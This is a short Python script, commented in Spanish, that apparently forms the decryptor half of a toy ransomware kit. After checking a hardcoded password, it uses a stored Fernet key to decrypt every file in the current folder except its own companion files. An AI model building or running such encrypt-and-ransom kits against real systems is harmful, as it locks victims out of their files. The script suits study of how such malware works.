#!/usr/bin/env python3

import os #para los archivos
from cryptography.fernet import Fernet #Para desifrar los archivos

#Leemos la llave del archivo
with open("laLlave.key","rb") as laLlave:
	llavesecreta = laLlave.read()

#Solicitamos la clave
clave = input("Ingresa la clave para desencriptar: ")

if clave!="QuetziHack":
	print("Contrase√±a incorrecta")
	exit()

#Guardamos los archivos que son parte del script
archivosprotegidos = ["encriptador.py",
	"desencriptador.py",
	"laLlave.key"]

#Recorremos los archivos de la carpeta}
for archivo in os.listdir():
	#Limpiamos los archivos protegidos y subcarpetas 
	if archivo not in archivosprotegidos and os.path.isfile(archivo):

		#Abrimos el archivo en lectura binaria
		with open(archivo,"rb") as elArchivo:
			#Guardamos el contenido
			contenido = elArchivo.read()

		#Deciframos el contenido
		contenidoDesencriptado = Fernet(llavesecreta).decrypt(contenido)

		#Abrimos el archivo en escritura binaria
		with open(archivo,"wb") as elArchivo:
			#Reescribimos con el contenido desifrado
			elArchivo.write(contenidoDesencriptado)

print("Mensaje de agradecimiento XD")











